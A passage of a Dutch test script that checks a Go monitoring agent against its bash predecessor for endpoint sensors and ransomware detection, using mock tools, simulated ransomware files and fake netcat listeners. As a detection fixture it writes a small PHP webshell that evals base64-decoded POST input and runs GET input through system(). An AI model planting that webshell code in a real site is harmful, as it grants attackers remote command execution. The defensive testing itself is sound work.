cat >"$E/bin/auditctl" <<'EOF'
#!/bin/bash
# namaak-auditctl: houdt de regels bij in AUD_DIR/rules
d=${AUD_DIR:?}; mkdir -p "$d"; touch "$d/rules"
echo "auditctl $*" >>"$d/log"
[ -f "$d/locked" ] && [ "$1" != -l ] && exit 1
case "$1" in
    -l) cat "$d/rules" ;;
    -D) grep -v "key=$3\$" "$d/rules" >"$d/rules.tmp"; mv -f "$d/rules.tmp" "$d/rules" ;;
    -a|-w) echo "-regel $* key=${*: -1}" >>"$d/rules" ;;
esac
exit 0
EOF
cat >"$E/bin/pidof" <<'EOF'
#!/bin/sh
[ "$1" = auditd ] && [ ! -f "${AUD_DIR:?}/stopped" ] && { echo 321; exit 0; }
exit 1
EOF
cat >"$E/bin/inotifywait" <<'EOF'
#!/bin/sh
exit 0
EOF
cat >"$E/bin/yara" <<'EOF'
#!/bin/sh
exit 0
EOF
cat >"$E/bin/ss" <<EOF
#!/bin/sh
case "\$*" in *established*) cat "$E/ss-e.txt" ;; *) cat "$E/ss-l.txt" ;; esac
EOF
chmod +x "$E/bin/"*
printf 'MONITOR_URL="https://198.51.100.200"\nPODMAN="0"\nDOCKER="0"\nSURICATA_EVE="%s"\n' "$E/eve.json" >"$E/g/conf"
edr_bash() {  # edr_bash report|net|file <uitvoer> [argument]: de echte code van de bash-agent
    (
        set +u   # de bash-agent draait zonder set -u
        export PATH="$E/bin:$PATH" AUD_DIR="$E/b/aud" CACHE_DIRECTORY="$E/b"
        HA_MODE=0; TEST=0; EDR=""; PODMAN=0; DOCKER=0; SURICATA_EVE="$E/eve.json"; MONITOR_URL="https://198.51.100.200"; MONITOR_URL_FALLBACK=""
        t_dir="$E/b"; t_cache="$E/b/tests.cache"; i_dir="$E/b/ids"
        lap() { :; }; id() { echo 0; }
        act_log() { printf '%s|%s|%s|%s\n' "$1" "$2" "$3" "${4-}" >>"$E/b/act"; }
        # shellcheck disable=SC1090
        source <(sed -n '/^json_escape() {/,/^}/p; /^json_text() {/,/^}/p' agent/src/15-realtime.sh; sed -n '/^ss_listen() {/,/^}/p' agent/src/00-kop.sh)
        # shellcheck disable=SC1090
        source <(sed -n '/^EDR="\${EDR-}"$/,/^# Testen zonder RzSense/p' agent/src/10-edr-sensoren.sh)
        case "$1" in
            report)
                # shellcheck disable=SC1090
                source <(sed -n '/^edr_json=""$/,/^fi$/p' agent/src/60-ids-en-edr.sh)
                printf '%s' "${edr_json:-null}" >"$2"
                if [ "${3-}" = commit ] && [ -n "$edr_json" ]; then
                    # shellcheck disable=SC1090
                    source <(sed -n '/if \[ -n "\$edr_json" \] && \[ -s "\$edr_dir\/edr.sending" \]; then/,/^    fi$/p; /eve.pos.new" \] && mv/p' agent/src/90-versturen.sh)
                fi ;;
            net)
                EDR_ROOT=""; EDR_USER=""; EDR_RZIPS=" 198.51.100.200 198.51.100.200 "
                edr_emit() { printf '%s\n' "$1"; }
                rm -f "$E/b/ss_t"
                edr_net_once "${3-0}" >"$2" ;;
            file)
                edr_emit() { printf '%s\n' "$1"; }
                edr_file "$3" >"$2" ;;
        esac
    ) || fail "de bash-code van de endpoint-sensoren faalde ($1)"
}
edr_go() {  # edr_go report|net|file|info <uitvoer> [argument]
    # shellcheck disable=SC2086
    PATH="$E/bin:$PATH" AUD_DIR="$E/g/aud" RZSENSE_BASH_CONF="$E/g/conf" RZSENSE_BASH_CACHE="$E/g/gc" RZSENSE_DATA="$E/g/gd" RZSENSE_TEST_ROOT=1 \
        "$work/rzsense" edr-parse "$1" ${3-} >"$2" || fail "de Go-agent kon de endpoint-sensoren niet uitvoeren ($1)"
}
edr_same() {  # edr_same <naam> <bash> <go>: dezelfde JSON (de tijd in een gebeurtenis telt niet)
    python3 -I - "$1" "$2" "$3" <<'PY' || fail "endpoint-sensoren ($1): de Go-agent meldt iets anders dan de bash-agent"
import json, sys
def load(p):
    t = open(p).read().strip()
    if t.startswith('{"k"'):   # een rij gebeurtenissen, één per regel
        l = [json.loads(x) for x in t.splitlines()]
        for e in l: e.pop('t', None)
        return sorted(json.dumps(e, sort_keys=True) for e in l)
    return json.loads(t) if t else None
a, g = load(sys.argv[2]), load(sys.argv[3])
if a != g:
    print('%s:\n  bash %s\n  go   %s' % (sys.argv[1], json.dumps(a, sort_keys=True)[:1800], json.dumps(g, sort_keys=True)[:1800])); sys.exit(1)
PY
}
edr_tests() { printf '%b' "$1" >"$E/b/tests.cache"; cp "$E/b/tests.cache" "$E/g/gc/tests.cache"; }
both_files() { for side in "$E/b" "$E/g/gd"; do mkdir -p "$side"; printf '%b' "$2" >"$side/$1"; done; }
# 1: aan: de regels worden gezet, de wachtrij gaat mee (alleen geldige regels), Suricata legt de eerste keer alleen vast
edr_tests '0\ttick\t30\n0\tedr\t1\n0\tedrself\t/opt/rzmon\twww-data\t0123456789abcdef01234567\n'
printf '{"timestamp":"2026-11-27T10:00:00.1+0100","event_type":"alert","src_ip":"203.0.113.9","src_port":4444,"dest_ip":"10.0.0.5","dest_port":22,"proto":"TCP","alert":{"action":"allowed","signature_id":2001219,"signature":"ET SCAN \\"Potential\\" SSH Scan","category":"Attempted Information Leak","severity":2}}\n' >"$E/eve.json"
both_files edr.spool '{"k":"n","t":1,"dir":"out","pid":5,"comm":"curl"}\nkapotte regel\n{"k":"f","t":2,"path":"/tmp/x"}\n'
both_files watch.state 'active 1795000000 ok ok ok\n'
edr_bash report "$E/r1.bash.json" commit; edr_go report "$E/r1.go.json" commit
edr_same "eerste rapport" "$E/r1.bash.json" "$E/r1.go.json"
cmp -s "$E/b/aud/log" "$E/g/aud/log" || fail "auditd-regels: de Go-agent roept auditctl anders aan: $(diff "$E/b/aud/log" "$E/g/aud/log" | head -n 8)"
grep -q -- '-S execve -k rzmon_exec' "$E/g/aud/log" && grep -q '"audit": *"ok"' "$E/r1.go.json" && grep -q '"watch": *"on"' "$E/r1.go.json" && [ ! -e "$E/g/gd/edr.sending" ] && [ ! -e "$E/b/edr.sending" ] \
    || fail "het eerste EDR-rapport: $(cat "$E/r1.go.json") $(tail -n 3 "$E/g/aud/log")"
# 2: nieuwe alerts van Suricata, een nieuwe gebeurtenis, en de regels staan er al (niets opnieuw zetten)
printf '{"timestamp":"2026-11-27T10:01:00.1+0100","event_type":"flow","src_ip":"1.1.1.1"}\n{"timestamp":"2026-11-27T10:02:00.1+0100","event_type":"alert","src_ip":"203.0.113.10","src_port":1,"dest_ip":"10.0.0.5","dest_port":80,"proto":"TCP","alert":{"action":"blocked","signature_id":7,"signature":"x\\\\y","category":"c","severity":1}}\n' >>"$E/eve.json"
both_files edr.spool '{"k":"c","t":3,"rt":"docker","act":"exec","name":"web"}\n'
edr_bash report "$E/r2.bash.json" commit; edr_go report "$E/r2.go.json" commit
edr_same "tweede rapport" "$E/r2.bash.json" "$E/r2.go.json"
cmp -s "$E/b/aud/log" "$E/g/aud/log" && grep -q '203.0.113.10' "$E/r2.go.json" && ! grep -q '203.0.113.9' "$E/r2.go.json" || fail "het tweede EDR-rapport: $(cat "$E/r2.go.json")"
# 3: een rapport dat niet aankomt: de gebeurtenissen blijven liggen en gaan de volgende keer mee
both_files edr.spool '{"k":"n","t":4,"dir":"listen","pid":9,"comm":"nc","lp":4444}\n'
edr_bash report "$E/r3.bash.json"; edr_go report "$E/r3.go.json"
both_files edr.spool '{"k":"n","t":5,"dir":"listen","pid":10,"comm":"nc","lp":4445}\n'
edr_bash report "$E/r4.bash.json" commit; edr_go report "$E/r4.go.json" commit
edr_same "na een mislukt rapport" "$E/r4.bash.json" "$E/r4.go.json"
grep -q '4444' "$E/r4.go.json" && grep -q '4445' "$E/r4.go.json" || fail "een gebeurtenis ging verloren na een mislukt rapport: $(cat "$E/r4.go.json")"
# 4: auditd vergrendeld (regels zetten lukt niet), en auditd gestopt
for side in "$E/b/aud" "$E/g/aud"; do : >"$side/rules"; : >"$side/locked"; done
edr_bash report "$E/r5.bash.json" commit; edr_go report "$E/r5.go.json" commit
edr_same "auditd vergrendeld" "$E/r5.bash.json" "$E/r5.go.json"
grep -q '"audit": *"locked"' "$E/r5.go.json" || fail "een vergrendelde auditd hoort gemeld te worden: $(cat "$E/r5.go.json")"
for side in "$E/b/aud" "$E/g/aud"; do mv -f "$side/locked" "$side/locked.uit"; : >"$side/stopped"; done
edr_bash report "$E/r6.bash.json" commit; edr_go report "$E/r6.go.json" commit
edr_same "auditd gestopt" "$E/r6.bash.json" "$E/r6.go.json"
for side in "$E/b/aud" "$E/g/aud"; do mv -f "$side/stopped" "$side/stopped.uit"; done
edr_bash report "$E/r7.bash.json" commit; edr_go report "$E/r7.go.json" commit   # de regels er weer in
# 5: uit in RzSense: de regels gaan weg en de wachtrij is leeg
both_files edr.spool '{"k":"n","t":6}\n'
edr_tests '0\ttick\t30\n'
edr_bash report "$E/r8.bash.json"; edr_go report "$E/r8.go.json"
cmp -s "$E/b/aud/log" "$E/g/aud/log" && [ ! -s "$E/g/aud/rules" ] && [ ! -e "$E/g/gd/edr.spool" ] && [ "$(cat "$E/r8.go.json")" = null ] || fail "EDR uit: de regels of de wachtrij bleven staan: $(cat "$E/r8.go.json") $(cat "$E/g/aud/rules")"
python3 -I - "$E" <<'PY' || fail "het logboek van de endpoint-sensoren wijkt af van dat van de bash-agent"
import json, subprocess, sys
E = sys.argv[1]
a = [l.rstrip('\n').split('|', 3) for l in open(E + '/b/act')]
g = [[e['m'], str(e['ok']), e['a'], e['d']] for e in map(json.loads, open(E + '/g/gd/act.log'))]
if a != g or len(a) < 3:
    print('bash %s\ngo   %s' % (a, g)); sys.exit(1)
PY
# de netwerksensor: de eerste keer alleen vastleggen; daarna nieuwe verbindingen naar buiten en nieuwe luisterpoorten
printf 'LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=800,fd=3))\n' >"$E/ss-l.txt"
printf '0 0 192.168.1.10:22 192.168.1.50:51234 users:(("sshd",pid=900,fd=4))\n0 0 192.168.1.10:44322 203.0.113.7:443 users:(("curl",pid=910,fd=5))\n' >"$E/ss-e.txt"
edr_tests '0\ttick\t30\n0\tedr\t1\n'
edr_bash net "$E/n1.bash" 1; edr_go net "$E/n1.go" first
[ ! -s "$E/n1.bash" ] && [ ! -s "$E/n1.go" ] || fail "de netwerksensor hoort de eerste keer alleen vast te leggen: $(cat "$E/n1.go")"
printf 'LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=800,fd=3))\nLISTEN 0 5 [::]:4444 [::]:* users:(("nc",pid=4000001,fd=3))\n' >"$E/ss-l.txt"
printf '0 0 192.168.1.10:44322 203.0.113.7:443 users:(("curl",pid=910,fd=5))\n0 0 192.168.1.10:50000 198.51.100.200:443 users:(("php",pid=4000002,fd=5))\n0 0 [2001:db8::1]:50001 [2001:db8::99]:6667 users:(("irc bot",pid=4000003,fd=3),("x",pid=1,fd=2))\n0 0 127.0.0.1:50002 127.0.0.1:5432 users:(("php",pid=1,fd=3))\n0 0 192.168.1.10:50003 [::ffff:203.0.113.8]:80 users:(("wget",pid=4000004,fd=3))\n' >"$E/ss-e.txt"
edr_bash net "$E/n2.bash" 0; edr_go net "$E/n2.go"
edr_same "netwerksensor" "$E/n2.bash" "$E/n2.go"
[ "$(wc -l <"$E/n2.go")" = 4 ] && grep -q '"own":"net"' "$E/n2.go" && grep -q '"dir":"listen"' "$E/n2.go" && grep -q '"rip":"203.0.113.8"' "$E/n2.go" || fail "de netwerksensor gaf iets onverwachts: $(cat "$E/n2.go")"
edr_bash net "$E/n3.bash" 0; edr_go net "$E/n3.go"
[ ! -s "$E/n3.bash" ] && [ ! -s "$E/n3.go" ] || fail "dezelfde verbinding hoort maar één keer per uur gemeld te worden: $(cat "$E/n3.go")"
# de bestandssensor: een programma en een script in /tmp, en een webshell in een webmap
ft=$(mktemp -d /tmp/rzproef-edr.XXXXXX); fw="${HOME:?}/.cache/rzproef-web.$$"; mkdir -p "$fw"   # buiten /tmp: daar gelden de regels voor webmappen
cp "$(type -P true)" "$ft/prog"; printf '#!/bin/sh\nid\n' >"$ft/s.sh"; chmod +x "$ft/s.sh"; printf 'tekst\n' >"$ft/notitie.txt"; cp "$(type -P true)" "$ft/lib.so"; printf 'x\n' >"$ft/niet-uitvoerbaar.sh"
printf '<?php\n$a = "x";\neval(base64_decode($_POST["c"]));\nSYSTEM($_GET["x"]);\n' >"$fw/shell.php"; printf '<?php echo "hallo";\n' >"$fw/gewoon.php"; printf 'eval($_POST[1]);\n' >"$fw/notitie.txt"
for f in "$ft/prog" "$ft/s.sh" "$ft/notitie.txt" "$ft/lib.so" "$ft/niet-uitvoerbaar.sh" "$fw/shell.php" "$fw/gewoon.php" "$fw/notitie.txt" "$ft/bestaat-niet"; do
    edr_bash file "$E/f.bash" "$f"; edr_go file "$E/f.go" "$f"
    [ -s "$E/f.go" ] && [ "$(cat "$E/f.go")" = "" ] && : >"$E/f.go"
    edr_same "bestand $f" "$E/f.bash" "$E/f.go"
    case "$f" in */prog|*/s.sh|*/shell.php) [ -s "$E/f.bash" ] || fail "de bestandssensor hoort $f te melden" ;; *) [ ! -s "$E/f.bash" ] || fail "de bestandssensor hoort $f niet te melden: $(cat "$E/f.bash")" ;; esac
done
edr_bash file "$E/f.bash" "$fw/shell.php"
grep -q '"susp":"base64_decode,eval,system"' "$E/f.bash" || fail "de webshell gaf andere kenmerken dan verwacht: $(cat "$E/f.bash")"
mv -f "$fw" "$ft/web.weg"
# de stand van de sensoren voor de proef: alleen kijken (geen auditctl die iets verandert)
n0=$(wc -l <"$E/g/aud/log"); edr_go info "$E/info.json"
[ "$(grep -c -v -- 'auditctl -l' <(tail -n +"$((n0 + 1))" "$E/g/aud/log"))" = 0 ] && grep -q '"file": *"ok"' "$E/info.json" || fail "in de proef hoort de Go-agent niets aan auditd te veranderen: $(tail -n 4 "$E/g/aud/log")"
printf '{"Name":"web","Image":"docker.io/library/nginx:1.27","Status":"exec","Type":"container"}\n' | "$work/rzsense" edr-parse ctr podman >"$E/ctr.out"
printf '{"status":"exec_start: sh -c id","id":"abc","from":"nginx","Type":"container","Action":"exec_start: sh -c id","Actor":{"ID":"abc","Attributes":{"execID":"e1","image":"nginx:1.27","name":"web"}}}\n{"Action":"start","Actor":{"Attributes":{"image":"redis","name":"cache"}}}\n' | "$work/rzsense" edr-parse ctr docker >>"$E/ctr.out"
[ "$(cat "$E/ctr.out")" = "web|docker.io/library/nginx:1.27|exec|
web|nginx:1.27|exec|sh -c id
cache|redis|start|" ] || fail "containergebeurtenissen: $(cat "$E/ctr.out")"
echo "✔ endpoint-sensoren (EDR): de parsers (auditd, Suricata), het rapport met de wachtrij (ook na een mislukt rapport), de auditd-regels (zetten, vergrendeld, gestopt, weghalen), de netwerksensor, de bestandssensor (programma, script, webshell) en containers: gelijk aan de bash-agent"

# 1.362.0 (Go-agent 0.31.0): ransomware herkennen. De echte bash-code en de Go-agent bewaken elk een eigen kopie van
# dezelfde mappen, met een namaak-testparm, -zfs en -lsof. Vergeleken wordt wat ze melden, wat er in de mappen ligt en
# het logboek.
R="$work/rs"; mkdir -p "$R/bin" "$R/b" "$R/g/gc" "$R/g/gd" "$R/g/gt"
cat >"$R/bin/testparm" <<'EOF'
#!/bin/sh
printf '[global]\n\tworkgroup = X\n[deel]\n\tpath = %s/share\n\tread only = No\n[weg]\n\tpath = /bestaat/niet\n[fout]\n\tpath = /a/../b\n' "${RS_TREE:?}"
EOF
cat >"$R/bin/zfs" <<'EOF'
#!/bin/sh
case "$1" in
    list) printf 'tank\t/\ntank/data\t%s\ntank/data/share\t%s/share\ntank/other\tnone\n' "${RS_TREE:?}" "${RS_TREE:?}" ;;
    snapshot) echo "zfs $*" | sed 's/-[0-9]\{8\}-[0-9]\{6\}$/-TIJD/' >>"${RS_TREE:?}/../zfs.log" ;;
esac
EOF
cat >"$R/bin/lsof" <<'EOF'
#!/bin/sh
cat "${RS_TREE:?}/../lsof.pids" 2>/dev/null
EOF
chmod +x "$R/bin/"*
for side in b g; do mkdir -p "$R/$side/tree/share/sub/diep" "$R/$side/tree/docs" "$R/$side/tree/leeg"; printf 'een\n' >"$R/$side/tree/share/a.txt"; printf 'twee\n' >"$R/$side/tree/docs/b.txt"; done
rs_tests() {  # rs_tests <regels met @T@ voor de map van deze kant>
    for side in b g; do printf '%b' "${1//@T@/$R/$side/tree}" | while IFS= read -r l; do
        case "$l" in *ransompath*) p=$(printf '%s' "$l" | cut -f3); printf '0\transompath\t%s\t%s\n' "$(printf '%s' "$p" | base64 -w0)" "$(printf '%s' "$l" | cut -f4)" ;; *) printf '%s\n' "$l" ;; esac
    done >"$R/$side/tests.cache"; done
    cp "$R/g/tests.cache" "$R/g/gc/tests.cache"
}
rs_bash() {  # rs_bash <uitvoer>: de echte code van de bash-agent
    (
        set +u
        export PATH="$R/bin:$PATH" RS_TREE="$R/b/tree"
        HA_MODE=0; RANSOM=1; t_dir="$R/b"; t_cache="$R/b/tests.cache"
        lap() { :; }; id() { echo 0; }
        act_log() { printf '%s|%s|%s|%s\n' "$1" "$2" "$3" "${4-}" >>"$R/b/act"; }
        # shellcheck disable=SC1090
        source <(sed -n '/^json_escape() {/,/^}/p' agent/src/15-realtime.sh)
        # shellcheck disable=SC1090
        source <(sed -n '/^ransom_json=""; rs_cand_json=""$/,/^fi$/p' agent/src/62-ransomware.sh)
        printf '%s' "${ransom_json:-null}" >"$1"
    ) || fail "de bash-code voor ransomware faalde"
}
rs_go() {
    printf 'MONITOR_URL="https://rz.test"\n' >"$R/g/conf"
    PATH="$R/bin:$PATH" RS_TREE="$R/g/tree" RZSENSE_BASH_CONF="$R/g/conf" RZSENSE_BASH_CACHE="$R/g/gc" RZSENSE_BASH_STATE="$R/g/gt" RZSENSE_DATA="$R/g/gd" RZSENSE_TEST_ROOT=1 \
        "$work/rzsense" ransom-test ${2-} >"$1" || fail "de Go-agent kon de ransomware-controle niet uitvoeren"
}
rs_same() {  # rs_same <naam>: wat gemeld is, wat er in de mappen ligt, en het logboek (zonder de map van de kant, tijd en pid)
    rs_bash "$R/$1.bash.json"; rs_go "$R/$1.go.json"
    python3 -I - "$R" "$1" <<'PY' || fail "ransomware ($1): de Go-agent doet iets anders dan de bash-agent"
import json, os, re, sys
R, name = sys.argv[1:3]
def norm(side, text):
    text = text.replace(R + '/' + side + '/tree', '@T@')
    text = re.sub(r'rzsense-ransom-[0-9]{8}-[0-9]{6}', 'rzsense-ransom-TIJD', text)
    return re.sub(r'pid [0-9]+', 'pid N', re.sub(r'"pid": ?[0-9]+', '"pid":0', text))
def load(side, ext):
    d = json.loads(norm(side, open('%s/%s.%s.json' % (R, name, ext)).read()))
    for p in (d or {}).get('paths', []):
        p['k'] = '-'; p['ex'] = sorted(p['ex'])
    return d
a, g = load('b', 'bash'), load('g', 'go')
def tree(side):
    out = []
    for d, _, fs in os.walk('%s/%s/tree' % (R, side)):
        out += [os.path.join(d, f).replace(R + '/' + side + '/tree', '') for f in fs]
    return sorted(out)
def rd(p): return open(p).read() if os.path.exists(p) else ''
bad = []
if a != g: bad.append('gemeld:\n  bash %s\n  go   %s' % (json.dumps(a, sort_keys=True, ensure_ascii=False), json.dumps(g, sort_keys=True, ensure_ascii=False)))
if tree('b') != tree('g'): bad.append('bestanden: alleen bash %s, alleen go %s' % ([f for f in tree('b') if f not in tree('g')], [f for f in tree('g') if f not in tree('b')]))
la = norm('b', rd(R + '/b/act')).splitlines()
lg = ['|'.join([e['m'], str(e['ok']), e['a'], e['d']]) for e in map(json.loads, norm('g', rd(R + '/g/gd/act.log')).splitlines())]
if sorted(la) != sorted(lg):   # de volgorde bij het opruimen hangt af van de sleutel van de map, en die verschilt hier per kant
    bad.append('logboek:\n  bash %s\n  go   %s' % (la[-4:], lg[-4:]))
if rd(R + '/b/zfs.log') != rd(R + '/g/zfs.log'): bad.append('snapshots: bash %r, go %r' % (rd(R + '/b/zfs.log'), rd(R + '/g/zfs.log')))
if bad: print('\n'.join(bad)); sys.exit(1)
PY
}
# 1: aan met lokaas: twee lokaasbestanden per map, nog niets te vergelijken; een map die niet bestaat of geen map is telt niet
rs_tests '0\ttick\t30\n0\transom\t1\t1\t1\n0\transompath\t@T@/share\t5\n0\transompath\t@T@/docs\tgeen-getal\n0\transompath\t@T@/bestaat-niet\t5\n0\transompath\t@T@/share/a.txt\t5\n0\transompath\t/\t5\n0\transompath\t/proc\t5\n'
rs_same eerste
grep -q '"canary": *"ok"' "$R/eerste.go.json" && [ -f "$R/g/tree/share/!0-RzSense-lokaas-niet-aanraken.txt" ] && [ -f "$R/g/tree/docs/zz-RzSense-lokaas-niet-aanraken.txt" ] \
    && grep -q '"smb", *"'"$R"'/g/tree/share"' "$R/eerste.go.json" || fail "de eerste ronde: $(cat "$R/eerste.go.json")"
[ "$(stat -c %a "$R/g/tree/share/zz-RzSense-lokaas-niet-aanraken.txt")" = 664 ] && [ "$(wc -l <"$R/g/tree/share/zz-RzSense-lokaas-niet-aanraken.txt")" = 4 ] || fail "het lokaasbestand ziet er anders uit dan bij de bash-agent"
sleep 1.1
rs_same rustig   # niets veranderd
grep -q '"hit": *0' "$R/rustig.go.json" || fail "zonder wijzigingen hoort er geen alarm te zijn: $(cat "$R/rustig.go.json")"
sleep 1.1
# 2: een aanval in share: versleutelde bestanden, een losgeldbriefje en tekst die niet meer te comprimeren is; docs: een gewone wijziging
for side in b g; do t="$R/$side/tree"
    for n in 1 2 3 4; do printf 'x' >"$t/share/foto$n.jpg.LOCKED"; done; printf 'betaal\n' >"$t/share/sub/HOW_TO_DECRYPT.txt"
    head -c 9000 /dev/urandom >"$t/share/sub/diep/rapport.txt"; head -c 5000 /dev/urandom >"$t/share/notities.md"; head -c 70000 /dev/urandom >"$t/share/data.csv"
    printf 'gewoon\n' >"$t/share/a.txt"; head -c 9000 /dev/zero | tr '\0' 'a' >"$t/docs/c.txt"; printf 'klein\n' >"$t/docs/b.txt"
    mkdir -p "$t/share/.zfs/snapshot/x"; printf 'x' >"$t/share/.zfs/snapshot/x/oud.locked"
done
rs_same aanval
python3 -I - "$R/aanval.go.json" <<'PY' || fail "de aanval werd niet herkend zoals verwacht"
import json, sys
p = {x['p'].split('/')[-1]: x for x in json.load(open(sys.argv[1]))['paths']}
s, d = p['share'], p['docs']
if not (s['n'] == 9 and s['ext'] == 4 and s['notes'] == 1 and s['enc'] == 3 and s['hit'] == 1 and 'rzsense-ransom-' in s['snap'] and len(s['ex']) == 5 and d['n'] == 2 and d['hit'] == 0 and d['enc'] == 0 and d['snap'] == ''):
    print(json.dumps(p, ensure_ascii=False)); sys.exit(1)
PY
grep -q 'zfs snapshot -r tank/data/share@rzsense-ransom-TIJD' "$R/g/zfs.log" || fail "de snapshot hoort van het diepste dataset te zijn: $(cat "$R/g/zfs.log")"
sleep 1.1
# 3: een lokaasbestand gewijzigd en een weg, en het schrijvende proces wordt gestopt (een snapshot hooguit eens per half uur)
for side in b g; do t="$R/$side/tree"; printf 'versleuteld' >"$t/docs/!0-RzSense-lokaas-niet-aanraken.txt"; mv -f "$t/docs/zz-RzSense-lokaas-niet-aanraken.txt" "$t/docs/zz.weg"
    printf 'x' >"$t/share/nog-een.encrypted"; sleep 300 & echo $! >"$R/$side/lsof.pids"; disown $! 2>/dev/null || true; echo 1 >>"$R/$side/lsof.pids"; done
rs_same lokaas
k_b=$(head -n 1 "$R/b/lsof.pids"); k_g=$(head -n 1 "$R/g/lsof.pids"); sleep 0.3
grep -q '"canary": *"alarm"' "$R/lokaas.go.json" && grep -q 'is gewijzigd; .*is weg; ' "$R/lokaas.go.json" && grep -q '"comm": *"sleep"' "$R/lokaas.go.json" \
    && ! kill -0 "$k_b" 2>/dev/null && ! kill -0 "$k_g" 2>/dev/null && [ "$(grep -c snapshot "$R/g/zfs.log")" = 2 ] || { kill "$k_b" "$k_g" 2>/dev/null; fail "lokaas geraakt: $(cat "$R/lokaas.go.json") $(cat "$R/g/zfs.log")"; }
for side in b g; do : >"$R/$side/lsof.pids"; done
# 4: in de proef raakt de Go-agent niets aan: geen lokaas, geen stand
before=$(find "$R/g/tree" "$R/g/gt" -type f | sort | xargs sha256sum | sha256sum)
rs_go "$R/obs.json" obs
[ "$(find "$R/g/tree" "$R/g/gt" -type f | sort | xargs sha256sum | sha256sum)" = "$before" ] && grep -q '"paths"' "$R/obs.json" && grep -q 'tree/share' "$R/obs.json" || fail "in de proef hoort de Go-agent niets aan te raken: $(cat "$R/obs.json")"
# 5: lokaas uit: de ongewijzigde lokaasbestanden gaan weg, het gewijzigde blijft liggen; 6: helemaal uit
rs_tests '0\ttick\t30\n0\transom\t0\t0\t0\n0\transompath\t@T@/share\t5\n'
rs_same lokaas-uit
[ ! -e "$R/g/tree/share/zz-RzSense-lokaas-niet-aanraken.txt" ] && [ -e "$R/g/tree/docs/!0-RzSense-lokaas-niet-aanraken.txt" ] && grep -q '"canary": *"uit"' "$R/lokaas-uit.go.json" || fail "lokaas uit: $(ls -a "$R/g/tree/share" "$R/g/tree/docs")"
rs_tests '0\ttick\t30\n'
rs_same uit
grep -q '"on": *0' "$R/uit.go.json" && [ "$(find "$R/g/gt/ransom" -type f ! -name cand | wc -l)" = "$(find "$R/b/ransom" -type f ! -name cand | wc -l)" ] || fail "ransomware uit: de stand bleef staan: $(ls "$R/g/gt/ransom" "$R/b/ransom")"
echo "✔ ransomware herkennen: lokaasbestanden (plaatsen, gewijzigd, weg, opruimen), extensies, losgeldbriefjes en versleutelde tekst, snapshot van het juiste dataset, het schrijvende proces stoppen, en het logboek: gelijk aan de bash-agent; in de proef raakt de Go-agent niets aan"

# ---------------------------------------------------------------- 1.344.0: overnemen per server
# systemd is er hier niet: een namaak-systemctl houdt bij welke timers aan staan. De rest is echt: RzSense vraagt het in
# het antwoord op een proefronde, de Go-agent haalt de testlijst op en stuurt het echte rapport, en RzSense neemt dat aan.
mkdir -p "$work/bin" "$work/units"
cat >"$work/bin/systemctl" <<EOS
#!/bin/sh
U="$work/units"
echo "\$*" >>"$work/systemctl.log"
case "\$1" in
    is-active) [ -e "\$U/\$2" ] && { echo active; exit 0; }; echo inactive; exit 3 ;;
    enable) for u in "\$@"; do case "\$u" in *.timer) : >"\$U/\$u" ;; esac; done ;;
    disable) for u in "\$@"; do case "\$u" in *.timer) rm -f "\$U/\$u" ;; esac; done ;;
    stop) [ -e "\$U/\$2" ] && mv -f "\$U/\$2" "$work/gestopt.\$2" ;;
esac
exit 0
EOS
chmod 755 "$work/bin/systemctl"
: >"$work/units/rzmon-agent.timer"; : >"$work/units/rzmon-agent-guard.timer"; : >"$work/fallback.timer"
# 1.346.0: updates installeren start de Go-agent via systemd-run; hier voert een namaak het commando gewoon uit
cat >"$work/bin/systemd-run" <<'EOS'
#!/bin/sh
case "$*" in *" watch") echo "$*" >>"${RZ_E2E_WORK:?}/systemd-run.log"; : >"${RZ_E2E_WORK:?}/units/rzsense-watch.service"; exit 0 ;; esac
while [ $# -gt 0 ]; do
    case "$1" in
        -p) shift 2 ;;
        --setenv=*) v=${1#--setenv=}; export "$v"; shift ;;
        -*) shift ;;
        *) break ;;
    esac
done
exec "$@"
EOS
chmod 755 "$work/bin/systemd-run"
export PATH="$work/bin:$work/pbin:$PATH" RZSENSE_FALLBACK_UNIT="$work/fallback.timer" DNF_LOG="$work/dnf.log"
# 1.345.0 (Go-agent 0.14.0): logins uit een logbestand, met de stand in het bestand van de bash-agent
printf 'AUTH_SOURCE="file"\nAUTH_LOGS="%s"\n' "$work/auth.log" >>"$work/rzmon-agent"
# 1.350.0: logs verzamelen en een log-check, uit een eigen map (LOG_DIRS)
mkdir -p "$work/applog"; printf 'oud\n' >"$work/applog/app.log"
printf 'LOG_DIRS="%s"\n' "$work/applog" >>"$work/rzmon-agent"
mkdir -p "$work/hbq"; printf 'HB_DIR="%s"\nPODMAN="0"\nDOCKER="0"\n' "$work/hbq" >>"$work/rzmon-agent"   # 1.351.0: heartbeats (containers hier uit)
echo "Oct 21 10:00:01 nas sshd[1]: Accepted password for oud from 192.0.2.1 port 1 ssh2" >"$work/auth.log"
export RZSENSE_AUTHSTATE="$work/cache/authstate"
unset RZSENSE_BASH_CACHE   # na het overnemen haalt de Go-agent de testlijst zelf op (in zijn eigen map)
SETFILE="$work/settings.json" php -r '
require "src/bootstrap.php";
$names = ["weblog_swag", "weblog_ha", "weblog_vw", "ids_enabled"];
$old = [];
foreach ($names as $n) { $old[$n] = setting($n); save_setting($n, "0"); }
$old["auth_events"] = setting("auth_events"); save_setting("auth_events", "1");   // 1.345.0: logins kan de Go-agent zelf
$old["patch_on"] = setting("patch_on"); save_setting("patch_on", "1");            // 1.346.0: updates ook
$old["vuln_enabled"] = setting("vuln_enabled"); save_setting("vuln_enabled", "1");  // 1.347.0: en de softwarelijst
file_put_contents(getenv("SETFILE"), json_encode($old));'
restore() { SETFILE="$work/settings.json" php -r '
require "src/bootstrap.php";
foreach ((array) json_decode((string) @file_get_contents(getenv("SETFILE")), true) as $n => $v) { if ($v === null) { q("DELETE FROM settings WHERE name = ?", [$n]); } else { save_setting($n, (string) $v); } }' 2>/dev/null || true; }
trap 'restore; kill "$sleeper" 2>/dev/null || true; rm -rf "$work"; php -r "require \"src/bootstrap.php\"; q(\"DELETE FROM hosts WHERE name = ?\", [\"go-e2e\"]);" 2>/dev/null || true' EXIT
take() { php -r 'require "src/bootstrap.php"; $id = (int) q("SELECT id FROM hosts WHERE name = ?", ["go-e2e"])->fetchColumn(); '"$1"; }

"$work/rzsense" shadow --quiet >/dev/null || fail "proefronde vóór het overnemen mislukt"
got=$(take '$c = AgentTakeover::check($id); echo json_encode([$c["can"], $c["blockers"], $c["need"], count($c["proof"]) > 0]);')
